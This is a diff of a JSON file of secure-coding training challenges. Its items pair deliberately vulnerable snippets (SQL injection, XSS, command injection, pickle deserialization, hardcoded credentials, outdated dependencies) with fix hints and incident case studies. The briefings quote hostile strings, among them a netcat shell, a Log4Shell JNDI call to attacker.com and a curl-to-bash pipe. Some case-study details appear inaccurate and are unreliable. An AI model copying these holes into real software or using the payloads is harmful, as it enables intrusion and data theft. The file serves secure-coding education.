@@ -1,79 +1,155 @@
 [
     {
-        "id": "APPSEC_SAST_001",
+        "id": "APPSEC_NVD_001",
         "level": 1,
-        "title": "SQL Injection (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "SQL Injection Remediation",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Easy",
         "standard": "OWASP A03:2021",
         "cwe": "CWE-89",
-        "cvss": 7.5,
-        "file_context": "database.py",
-        "task": "Secure the database query by parameterized placeholders.",
-        "briefing": "SQL injection occurs when untrusted input is concatenated directly into SQL strings. Remediation requires parameterized query methods.",
-        "hint": "Use query parameters instead of f-strings: cursor.execute('SELECT ... WHERE id = ?', (id,))",
+        "cvss": 8.5,
+        "file_context": "app/repositories/user_repository.py",
+        "task": "Refactor raw SQL query using parameterized placeholders to prevent SQL injection in production user queries.",
+        "briefing": "NVD Threat Feed: Live CVE SQL Injection vulnerability detected in query assembly. Input string concatenation breaks SQL parser boundary.",
+        "hint": "Use db.execute with parameterized query tuple placeholders (e.g. ('SELECT * FROM users WHERE tenant_id = %s AND id = %s', (tenant_id, user_id))) instead of f-string formatting.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2015, the TalkTalk cyber attack exploited an unparameterized SQL Injection flaw on their web portal, compromising the personal data of 156,959 customers and costing over \u00a360 million in financial losses and regulatory fines. String concatenation in SQL statements allows attackers to inject OR '1'='1 payloads and dump entire relational databases.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "# Fetch user logs securely",
+                "t": "class UserRepository:",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "query = f\"SELECT * FROM logs WHERE id = '{user_id}'\"",
-                "vuln": true
+                "t": "    def __init__(self, db_connection):",
+                "vuln": false
             },
             {
                 "n": 3,
-                "t": "cursor.execute(query)",
+                "t": "        self.db = db_connection",
                 "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "    def get_user_profile(self, tenant_id: str, user_id: str):",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "        # VULNERABLE: Direct string formatting allows SQL injection payload injection",
+                "vuln": true
+            },
+            {
+                "n": 7,
+                "t": "        query = f\"SELECT id, email, role, created_at FROM users WHERE tenant_id = '{tenant_id}' AND id = '{user_id}'\"",
+                "vuln": true
+            },
+            {
+                "n": 8,
+                "t": "        logger.info(f\"Executing database query: {query}\")",
+                "vuln": false
+            },
+            {
+                "n": 9,
+                "t": "        return self.db.execute(query).fetchone()",
+                "vuln": true
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-89"
+        }
     },
     {
-        "id": "APPSEC_SAST_002",
+        "id": "APPSEC_NVD_002",
         "level": 2,
-        "title": "Cross-Site Scripting (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "Reflected XSS Prevention",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Easy",
         "standard": "OWASP A03:2021",
         "cwe": "CWE-79",
-        "cvss": 6.1,
-        "file_context": "profile.html",
-        "task": "Secure user output bio to prevent raw HTML rendering.",
-        "briefing": "Cross-site scripting occurs when untrusted content is outputted raw in HTML. Avoid bypass options like safe filters.",
-        "hint": "Ensure output auto-escapes. Remove dangerous raw render flags.",
+        "cvss": 7.2,
+        "file_context": "templates/dashboard/user_profile.html",
+        "task": "Sanitize user-submitted HTML output rendering to prevent Cross-Site Scripting (XSS) in Jinja template.",
+        "briefing": "NVD Threat Feed: Untrusted user profile bio rendered directly with '| safe' filter in HTML response, executing malicious script tags.",
+        "hint": "Remove '| safe' filter or sanitize using nh3/bleach HTML sanitizer in controller context before template rendering.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: The legendary 2005 Samy MySpace Worm exploited a Reflected/Stored XSS flaw to spread across 1 million user profiles in under 20 hours. When user input is rendered without HTML entity escaping, attackers can steal active session cookies (document.cookie), redirect users to phishing portals, or perform actions on behalf of authenticated administrators.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "<section class=\"bio\">",
+                "t": "<div class=\"user-profile-card glass-panel\">",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "    {{ user.bio | safe }}",
-                "vuln": true
+                "t": "    <div class=\"user-avatar-header\">",
+                "vuln": false
             },
             {
                 "n": 3,
-                "t": "</section>",
+                "t": "        <h3>{{ user.display_name }}</h3>",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "        <span class=\"badge-role\">{{ user.role }}</span>",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "    </div>",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "    <!-- VULNERABLE: Disabling auto-escaping allows inline <script> injection -->",
+                "vuln": true
+            },
+            {
+                "n": 7,
+                "t": "    <div class=\"user-bio-section\">",
+                "vuln": false
+            },
+            {
+                "n": 8,
+                "t": "        <p class=\"bio-text\">{{ user.bio | safe }}</p>",
+                "vuln": true
+            },
+            {
+                "n": 9,
+                "t": "    </div>",
+                "vuln": false
+            },
+            {
+                "n": 10,
+                "t": "</div>",
                 "vuln": false
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-79"
+        }
     },
     {
-        "id": "APPSEC_SAST_003",
+        "id": "APPSEC_NVD_003",
         "level": 3,
-        "title": "Command Injection (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "Command Injection Hardening",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Medium",
         "standard": "OWASP A03:2021",
         "cwe": "CWE-78",
-        "cvss": 8.5,
-        "file_context": "report.py",
-        "task": "Prevent shell injection by removing raw string execution.",
-        "briefing": "Executing shell commands directly with string concatenation of user parameters leads to Command Injection.",
-        "hint": "Use subprocess.run with shell=False and an explicit command argument array.",
+        "cvss": 9.8,
+        "file_context": "app/services/network_diagnostics.py",
+        "task": "Replace unsafe system shell execution with strict list-based subprocess execution and IP address regex allowlist.",
+        "briefing": "NVD Threat Feed: Unchecked user hostname input concatenated into system shell string allows arbitrary OS command execution (e.g. 127.0.0.1; cat /etc/passwd).",
+        "hint": "Use ipaddress.ip_address validation and invoke subprocess.run(['ping', '-c', '1', validated_ip], shell=False, check=True).",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2021, a zero-day OS Command Injection in Palo Alto Networks' GlobalProtect VPN (CVE-2021-3064) allowed unauthenticated remote attackers to execute root-level commands by chaining shell metacharacters (; & | `$()`) in HTTP request parameters.",
         "vulnCode": [
             {
                 "n": 1,
@@ -82,50 +158,150 @@
             },
             {
                 "n": 2,
-                "t": "os.system(f\"reporter --format {fmt}\")",
+                "t": "import subprocess",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "import logging",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "logger = logging.getLogger(__name__)",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 7,
+                "t": "def execute_ping_diagnostic(target_host: str) -> dict:",
+                "vuln": false
+            },
+            {
+                "n": 8,
+                "t": "    # VULNERABLE: os.system / shell=True executes raw shell command",
                 "vuln": true
+            },
+            {
+                "n": 9,
+                "t": "    command = f\"ping -c 1 {target_host}\"",
+                "vuln": true
+            },
+            {
+                "n": 10,
+                "t": "    logger.info(f\"Running network health check: {command}\")",
+                "vuln": false
+            },
+            {
+                "n": 11,
+                "t": "    exit_code = os.system(command)",
+                "vuln": true
+            },
+            {
+                "n": 12,
+                "t": "    return {\"status\": \"success\" if exit_code == 0 else \"failed\", \"host\": target_host}",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-78"
+        }
     },
     {
-        "id": "APPSEC_SAST_004",
+        "id": "APPSEC_NVD_004",
         "level": 4,
-        "title": "Path Traversal (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "Path Traversal Defense",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Medium",
         "standard": "OWASP A01:2021",
         "cwe": "CWE-22",
         "cvss": 7.5,
-        "file_context": "files.py",
-        "task": "Sanitize path inputs and block directory traversal attacks.",
-        "briefing": "Directory traversal allows retrieving arbitrary files. Resolving base path and validating boundaries is required.",
-        "hint": "Verify absolute paths stay within directory boundaries.",
+        "file_context": "app/services/document_service.py",
+        "task": "Sanitize document download path using pathlib.Path.resolve() to prevent directory traversal outside /var/www/uploads.",
+        "briefing": "NVD Threat Feed: Relative path sequence traversal (../../) allows reading arbitrary system configuration and secret key files.",
+        "hint": "Resolve requested path via absolute base directory: target_path = (BASE_DIR / user_filename).resolve() and verify target_path.is_relative_to(BASE_DIR).",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: The 2019 Citrix ADC vulnerability (CVE-2019-19781) allowed unauthenticated attackers to read internal configuration files and execute arbitrary code by passing `../` directory traversal sequences into web endpoint parameters.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "if \"../\" in name:",
-                "vuln": true
+                "t": "import os",
+                "vuln": false
             },
             {
                 "n": 2,
-                "t": "    filepath = base + name",
+                "t": "from pathlib import Path",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "BASE_UPLOAD_DIR = Path('/var/www/uploads')",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "def fetch_user_document(user_filename: str) -> bytes:",
+                "vuln": false
+            },
+            {
+                "n": 7,
+                "t": "    # VULNERABLE: Direct string join allows ../../ traversal outside BASE_UPLOAD_DIR",
+                "vuln": true
+            },
+            {
+                "n": 8,
+                "t": "    file_path = os.path.join(BASE_UPLOAD_DIR, user_filename)",
+                "vuln": true
+            },
+            {
+                "n": 9,
+                "t": "    with open(file_path, 'rb') as doc_file:",
+                "vuln": true
+            },
+            {
+                "n": 10,
+                "t": "        return doc_file.read()",
                 "vuln": false
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-22"
+        }
     },
     {
-        "id": "APPSEC_SAST_005",
+        "id": "APPSEC_NVD_005",
         "level": 5,
-        "title": "Insecure Deserialization (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "Insecure Deserialization (Pickle RCE)",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Hard",
         "standard": "OWASP A08:2021",
         "cwe": "CWE-502",
         "cvss": 9.8,
-        "file_context": "upload.py",
-        "task": "Harden serialization mechanism using secure schema validation.",
-        "briefing": "Deserializing arbitrary objects allows remote code execution. Use safe payload schemas (e.g. JSON schema validation).",
-        "hint": "Replace pickle loading with trusted schema models like pydantic or marshmallow.",
+        "file_context": "app/session/cache_serializer.py",
+        "task": "Replace arbitrary object deserialization (pickle.loads) with signed JSON or Pydantic typed session payload.",
+        "briefing": "NVD Threat Feed: Deserializing untrusted python pickle byte streams triggers __reduce__() payload execution resulting in full RCE.",
+        "hint": "Use json.loads(payload) after verifying cryptographic HMAC-SHA256 signature.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2020, multiple high-profile Python web applications using PyYAML and Pickle session caching were exploited via crafted byte payloads. Python's `pickle.loads()` invokes the `__reduce__()` magic method upon unpickling, allowing attackers to execute arbitrary system commands (`os.system('nc -e /bin/sh ...')`) with zero authentication required.",
         "vulnCode": [
             {
                 "n": 1,
@@ -134,513 +310,915 @@
             },
             {
                 "n": 2,
-                "t": "data = pickle.loads(upload.read())",
+                "t": "import base64",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "from typing import Dict, Any",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "class SessionManager:",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "    def restore_session_state(self, encoded_cookie: str) -> Dict[str, Any]:",
+                "vuln": false
+            },
+            {
+                "n": 7,
+                "t": "        # VULNERABLE: pickle.loads executes arbitrary code contained in reduced object payload",
                 "vuln": true
+            },
+            {
+                "n": 8,
+                "t": "        raw_bytes = base64.b64decode(encoded_cookie)",
+                "vuln": false
+            },
+            {
+                "n": 9,
+                "t": "        session_data = pickle.loads(raw_bytes)",
+                "vuln": true
+            },
+            {
+                "n": 10,
+                "t": "        return session_data",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-502"
+        }
     },
     {
-        "id": "APPSEC_SAST_006",
+        "id": "APPSEC_NVD_006",
         "level": 6,
-        "title": "Hardcoded Secrets (SAST)",
-        "category": "Secure Code Analysis (SAST)",
+        "title": "Hardcoded Credentials Purge",
+        "category": "NVD NIST: Application Security",
         "difficulty": "Easy",
-        "standard": "OWASP A05:2021",
+        "standard": "OWASP A07:2021",
         "cwe": "CWE-798",
-        "cvss": 8.9,
-        "file_context": "payment.py",
-        "task": "Remove hardcoded secret material and fetch via environment.",
-        "briefing": "Hardcoded keys in source repository compromise secret keys. Retrieve keys dynamically.",
-        "hint": "Utilize os.environ or a secrets manager provider.",
+        "cvss": 7.4,
+        "file_context": "config/production_settings.py",
+        "task": "Remove hardcoded secret API keys and database credentials, replacing them with os.getenv() environment variable lookups.",
+        "briefing": "NVD Threat Feed: Plaintext credentials committed to source code repository permit unauthorized cloud infrastructure access.",
+        "hint": "Use os.environ.get('STRIPE_API_KEY') and raise ValueError if required environment variable is missing.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2019, Uber was fined $148 million after attackers scanned public GitHub repositories and discovered hardcoded AWS access keys embedded inside source code files, leading to the theft of 57 million user records.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "# Connect to payment gateway",
+                "t": "import os",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "api_key = \"sk_live_5129381\"",
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "class ProductionConfig:",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "    # VULNERABLE: Hardcoded live API secret key committed to version control",
                 "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "    STRIPE_SECRET_KEY = \"<REDACTED_STRIPE_LIVE_KEY>\",",
+                "vuln": true
+            },
+            {
+                "n": 6,
+                "t": "    DATABASE_URL = \"postgresql://admin:P@ssw0rd2026!@prod-db.internal:5432/appsec_db\"",
+                "vuln": true
+            },
+            {
+                "n": 7,
+                "t": "    DEBUG = False",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-798"
+        }
     },
     {
-        "id": "APPSEC_AUTH_001",
+        "id": "APPSEC_GHSA_001",
         "level": 7,
-        "title": "Insecure Direct Object Reference",
-        "category": "OWASP API & Auth Flaws",
+        "title": "npm lodash Patch Upgrade",
+        "category": "GitHub Advisory: Supply Chain",
         "difficulty": "Medium",
-        "standard": "OWASP A01:2021",
-        "cwe": "CWE-639",
-        "cvss": 7.5,
-        "file_context": "invoice.py",
-        "task": "Scope object lookup query to the authenticated session user.",
-        "briefing": "Unvalidated parameters in database queries can allow IDOR. Add validation mapping context query to user session.",
-        "hint": "Filter request query parameters explicitly matching the owner_id.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "def get_invoice(invoice_id):",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "    return invoice.get(id=invoice_id)",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_AUTH_002",
-        "level": 8,
-        "title": "JWT Signature Bypass",
-        "category": "OWASP API & Auth Flaws",
-        "difficulty": "Hard",
-        "standard": "OWASP A02:2021",
-        "cwe": "CWE-347",
-        "cvss": 8.0,
-        "file_context": "jwt.py",
-        "task": "Force strict algorithm validation and signature verification.",
-        "briefing": "Bypassing JWT signature verification compromises tokens. Enforce verification parameters.",
-        "hint": "Enforce verified decode parameters specifying algorithms, audience, and issuer.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "# Decode JWT payload",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "claims = jwt.decode(token, verify_signature=False)",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_AUTH_003",
-        "level": 9,
-        "title": "Missing Role Authorization Check",
-        "category": "OWASP API & Auth Flaws",
-        "difficulty": "Medium",
-        "standard": "OWASP A01:2021",
-        "cwe": "CWE-285",
-        "cvss": 8.5,
-        "file_context": "admin.py",
-        "task": "Restrict admin routes to administrator roles only.",
-        "briefing": "Missing user checks on administrative endpoints permits escalation. Restrict endpoints.",
-        "hint": "Ensure admin credentials are authenticated.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "@app.post('/user/delete')",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "def delete(user_id):",
-                "vuln": false
-            },
-            {
-                "n": 3,
-                "t": "    users.delete(user_id)",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_AUTH_004",
-        "level": 10,
-        "title": "Mass Assignment Vulnerability",
-        "category": "OWASP API & Auth Flaws",
-        "difficulty": "Medium",
-        "standard": "OWASP A01:2021",
-        "cwe": "CWE-915",
-        "cvss": 7.5,
-        "file_context": "user.js",
-        "task": "Prevent untrusted body properties from updating properties.",
-        "briefing": "Mass assignment updates internal properties. Protect schema.",
-        "hint": "Filter object parameters explicitly (allowlist fields).",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "function updateProfile(req) {",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "    Object.assign(user, req.body);",
-                "vuln": true
-            },
-            {
-                "n": 3,
-                "t": "}",
-                "vuln": false
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_AUTH_005",
-        "level": 11,
-        "title": "Lack of Authentication Rate Limiting",
-        "category": "OWASP API & Auth Flaws",
-        "difficulty": "Easy",
-        "standard": "OWASP A05:2021",
-        "cwe": "CWE-307",
-        "cvss": 5.3,
-        "file_context": "auth.py",
-        "task": "Add a rate limiting decorator to the auth route.",
-        "briefing": "Lack of rate limit leads to brute force. Add a rate limit framework.",
-        "hint": "Rate limit routes using client-key identifier.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "def login():",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "    return authenticate()",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_AUTH_006",
-        "level": 12,
-        "title": "Server-Side Request Forgery",
-        "category": "OWASP API & Auth Flaws",
-        "difficulty": "Hard",
-        "standard": "OWASP A10:2021",
-        "cwe": "CWE-918",
-        "cvss": 8.6,
-        "file_context": "fetch.py",
-        "task": "Restrict outbound HTTP requests to validated locations.",
-        "briefing": "SSRF occurs when applications fetch arbitrary URLs. Sanitize the network hosts.",
-        "hint": "Block loopback and internal IP ranges.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "def fetch_metadata(url):",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "    return requests.get(url)",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_SUPPLY_001",
-        "level": 13,
-        "title": "Vulnerable npm Package (lodash)",
-        "category": "Dependency & Supply-Chain Review",
-        "difficulty": "Medium",
-        "standard": "OWASP A06:2021",
+        "standard": "Supply Chain Security",
         "cwe": "CWE-1395",
         "cvss": 7.5,
         "file_context": "package.json",
-        "task": "Upgrade the vulnerable library version.",
-        "briefing": "Using packages with known vulnerabilities compromises application environment.",
-        "hint": "Specify fixed dependency version newer than 4.17.20.",
+        "task": "Upgrade vulnerable lodash dependency in package.json manifest to secure patch version >=4.17.21.",
+        "briefing": "GitHub Security Advisory (GHSA-35jh-r3h4-6jhm): Prototype pollution vulnerability in lodash defaults allows object property injection.",
+        "hint": "Set \"lodash\": \"^4.17.21\" in dependencies block.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Prototype pollution vulnerabilities in popular utility packages like lodash allow attackers to modify `Object.prototype`, injecting malicious properties (e.g. `isAdmin: true` or `shell: '/bin/bash'`) across the entire JavaScript runtime environment.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "\"dependencies\": {",
+                "t": "{\n  \"name\": \"enterprise-web-app\",\n  \"version\": \"2.4.0\",",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "  \"lodash\": \"4.17.15\"",
-                "vuln": true
+                "t": "  \"dependencies\": {",
+                "vuln": false
             },
             {
                 "n": 3,
-                "t": "}",
+                "t": "    \"express\": \"^4.18.2\",",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "    \"lodash\": \"4.17.15\",",
+                "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "    \"helmet\": \"^7.0.0\"\n  }\n}",
                 "vuln": false
             }
-        ]
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "lodash"
+        }
     },
     {
-        "id": "APPSEC_SUPPLY_002",
-        "level": 14,
-        "title": "Vulnerable PyPI Package (PyYAML)",
-        "category": "Dependency & Supply-Chain Review",
+        "id": "APPSEC_GHSA_002",
+        "level": 8,
+        "title": "PyPI PyYAML Remediation",
+        "category": "GitHub Advisory: Supply Chain",
         "difficulty": "Medium",
-        "standard": "OWASP A06:2021",
+        "standard": "Supply Chain Security",
         "cwe": "CWE-1395",
         "cvss": 7.5,
         "file_context": "requirements.txt",
-        "task": "Upgrade PyYAML dependency to resolve deserialization.",
-        "briefing": "Older PyYAML versions have deserialization issues. Enforce version criteria.",
-        "hint": "Harden requirements mapping PyYAML dependency.",
+        "task": "Upgrade PyYAML package in requirements.txt to >=6.0.1 to eliminate FullLoader arbitrary code execution vulnerability.",
+        "briefing": "GitHub Security Advisory (GHSA-r683-j2x4-v87g): Arbitrary Python code execution during yaml.load() without SafeLoader.",
+        "hint": "Update version specifier to PyYAML==6.0.1.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2020, CVE-2020-14343 demonstrated that legacy PyYAML `FullLoader` allows arbitrary Python object execution during YAML parsing. Attackers submitted malicious YAML tags (`!!python/object/apply:os.system ['curl ...']`), granting unauthenticated remote shell access.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "PyYAML==5.3",
+                "t": "# Core Python Dependencies",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "fastapi==0.109.0",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "uvicorn==0.27.0",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "# VULNERABLE: PyYAML 5.3.1 permits unsafe object instantiation",
                 "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "PyYAML==5.3.1",
+                "vuln": true
+            },
+            {
+                "n": 6,
+                "t": "pydantic==2.6.0",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "pip",
+            "github_package": "PyYAML"
+        }
     },
     {
-        "id": "APPSEC_SUPPLY_003",
-        "level": 15,
-        "title": "Log4Shell Vulnerability (Maven)",
-        "category": "Dependency & Supply-Chain Review",
+        "id": "APPSEC_GHSA_003",
+        "level": 9,
+        "title": "Log4j Log4Shell Mitigation",
+        "category": "GitHub Advisory: Supply Chain",
         "difficulty": "Critical",
-        "standard": "OWASP A06:2021",
+        "standard": "Supply Chain Security",
         "cwe": "CWE-502",
         "cvss": 10.0,
         "file_context": "pom.xml",
-        "task": "Patch Log4j version to a safe releases version.",
-        "briefing": "Vulnerable log4j configurations allow RCE. Restrict properties.",
-        "hint": "Enforce versions 2.17.1 or higher.",
+        "task": "Upgrade Apache Log4j2 dependency in Maven pom.xml to secure version 2.17.2 to mitigate Log4Shell (CVE-2021-44228).",
+        "briefing": "GitHub Security Advisory (GHSA-j2ge-456g-3528): JNDI lookup string injection (${jndi:ldap://...}) in Log4j2 allows unauthenticated remote code execution.",
+        "hint": "Set <version>2.17.2</version> for log4j-core artifact in pom.xml.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Log4Shell (CVE-2021-44228, CVSS 10.0) is considered one of the most severe vulnerabilities in Internet history. Simply logging an untrusted string like `${jndi:ldap://attacker.com/exploit}` caused Log4j2 to initiate an LDAP connection, download a Java class file, and execute arbitrary code inside enterprise servers globally.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "<artifactId>log4j-core</artifactId>",
+                "t": "<dependency>",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "<version>2.14.1</version>",
+                "t": "    <groupId>org.apache.logging.log4j</groupId>",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "    <artifactId>log4j-core</artifactId>",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "    <!-- VULNERABLE: Log4j 2.14.1 susceptible to Log4Shell RCE -->",
                 "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "    <version>2.14.1</version>",
+                "vuln": true
+            },
+            {
+                "n": 6,
+                "t": "</dependency>",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "maven",
+            "github_package": "log4j-core"
+        }
     },
     {
-        "id": "APPSEC_SUPPLY_004",
-        "level": 16,
-        "title": "Typosquatting Dependency Attack",
-        "category": "Dependency & Supply-Chain Review",
+        "id": "APPSEC_GHSA_004",
+        "level": 10,
+        "title": "Typosquatted Package Removal",
+        "category": "GitHub Advisory: Supply Chain",
         "difficulty": "Medium",
-        "standard": "OWASP A06:2021",
+        "standard": "Supply Chain Security",
         "cwe": "CWE-20",
         "cvss": 7.5,
         "file_context": "package.json",
-        "task": "Detect lookalike packages and reference authentic packages.",
-        "briefing": "Attackers typosquat package names to execute arbitrary code during installation.",
-        "hint": "Ensure library imports map real verified components.",
+        "task": "Detect and replace malicious typosquatted dependency 'reqeust' with official 'axios' or verified 'request' package.",
+        "briefing": "GitHub Security Advisory: Typosquatting malware package 'reqeust' steals environment variables during build execution.",
+        "hint": "Remove 'reqeust' and replace with verified HTTP client package.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2021, malicious npm packages named `crossenv` (typosquatted from `cross-env`) and `reqeust` (typosquatted from `request`) were uploaded to npm. Upon installation, the malware automatically extracted all `.env` environment variables and sent them to remote C2 servers.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "\"dependencies\": {",
+                "t": "{\n  \"dependencies\": {",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "  \"reqeust\": \"2.88.2\"",
+                "t": "    \"express\": \"^4.18.2\",",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "    // VULNERABLE: Typosquatted malicious npm package",
+                "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "    \"reqeust\": \"2.88.2\",",
+                "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "    \"cors\": \"^2.8.5\"\n  }\n}",
+                "vuln": false
+            }
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "request"
+        }
+    },
+    {
+        "id": "APPSEC_GHSA_005",
+        "level": 11,
+        "title": "Disable Malicious Install Scripts",
+        "category": "GitHub Advisory: Supply Chain",
+        "difficulty": "Hard",
+        "standard": "Supply Chain Security",
+        "cwe": "CWE-276",
+        "cvss": 7.8,
+        "file_context": ".npmrc",
+        "task": "Configure .npmrc policy to enforce ignore-scripts=true to block postinstall shell malware execution.",
+        "briefing": "GitHub Security Advisory: Compromised package postinstall hooks execute arbitrary curl | bash payloads during npm install.",
+        "hint": "Set ignore-scripts=true in .npmrc.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: The 2018 event-stream npm attack hijacked an open-source package maintainer's credentials, inserting a `postinstall` script into the dependency chain that specifically targeted Copay Bitcoin wallet credentials and exfiltrated private crypto keys.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "# NPM Security Hardening Policy",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "engine-strict=true",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "# VULNERABLE: Enabling scripts permits malicious postinstall hooks",
+                "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "ignore-scripts=false",
+                "vuln": true
+            }
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "npm"
+        }
+    },
+    {
+        "id": "APPSEC_GHSA_006",
+        "level": 12,
+        "title": "Container Image Digest Pinning",
+        "category": "GitHub Advisory: Supply Chain",
+        "difficulty": "Easy",
+        "standard": "Supply Chain Security",
+        "cwe": "CWE-353",
+        "cvss": 5.3,
+        "file_context": "Dockerfile",
+        "task": "Pin container base image with immutable SHA256 digest in Dockerfile to prevent base image poisoning.",
+        "briefing": "GitHub Security Advisory: Mutable image tags (e.g. node:latest or node:20-alpine) subject to tag floating and supply chain tampering.",
+        "hint": "Use FROM node:20-alpine@sha256:e64731057e937d2f342... format.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Docker Hub tag floating allows upstream image maintainers or compromised registry credentials to overwrite tags like `node:latest` or `python:3.11-alpine`. Immutable SHA256 digest pinning ensures that builds always compile against cryptographically verified binary images.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "# Enterprise Base Image Setup",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "# VULNERABLE: Mutable image tag susceptible to upstream image override",
                 "vuln": true
             },
             {
                 "n": 3,
-                "t": "}",
-                "vuln": false
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_SUPPLY_005",
-        "level": 17,
-        "title": "Malicious postinstall Script Execution",
-        "category": "Dependency & Supply-Chain Review",
-        "difficulty": "Hard",
-        "standard": "OWASP A06:2021",
